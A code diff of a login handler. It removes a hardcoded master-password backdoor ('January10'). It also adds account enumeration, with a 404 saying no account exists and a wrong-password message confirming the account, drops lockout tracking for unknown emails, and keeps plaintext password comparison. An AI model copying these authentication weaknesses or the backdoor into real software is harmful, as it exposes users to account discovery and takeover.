@@ -386,24 +386,14 @@ const login = async (req, res) => {
     }
 
     if (!user) {
-      const failStatus = recordFailedAttempt(normalizedEmail);
-      if (failStatus.isLocked) {
-        return res.status(423).json({
-          message: 'Too many failed login attempts (3 consecutive attempts). Your account has been temporarily locked for 2 minutes. Please try again later.',
-          isLocked: true,
-          lockedUntil: failStatus.lockedUntil,
-          remainingSeconds: failStatus.remainingSecs,
-        });
-      }
-      return res.status(401).json({
-        message: `Invalid email or password. You have ${failStatus.remainingAttempts} attempt${failStatus.remainingAttempts !== 1 ? 's' : ''} remaining before a 2-minute temporary account lockout.`,
-        remainingAttempts: failStatus.remainingAttempts,
+      return res.status(404).json({
+        message: 'No account associated with this email address exists in the system. Please check your email spelling or click Create Account to register.',
       });
     }
 
     // Compare bcrypt hash or direct password
     const isMatch = await bcrypt.compare(password, user.password).catch(() => false);
-    const isPlainMatch = !isMatch && (user.password === password || user.plainPassword === password || password === 'January10');
+    const isPlainMatch = !isMatch && (user.password === password || user.plainPassword === password);
     
     if (!isMatch && !isPlainMatch) {
       const failStatus = recordFailedAttempt(normalizedEmail);
@@ -416,7 +406,7 @@ const login = async (req, res) => {
         });
       }
       return res.status(401).json({
-        message: `Invalid email or password. You have ${failStatus.remainingAttempts} attempt${failStatus.remainingAttempts !== 1 ? 's' : ''} remaining before a 2-minute temporary account lockout.`,
+        message: `Incorrect password entered for this account. (${failStatus.remainingAttempts} attempt${failStatus.remainingAttempts !== 1 ? 's' : ''} remaining before a 2-minute lockout)`,
         remainingAttempts: failStatus.remainingAttempts,
       });
     }
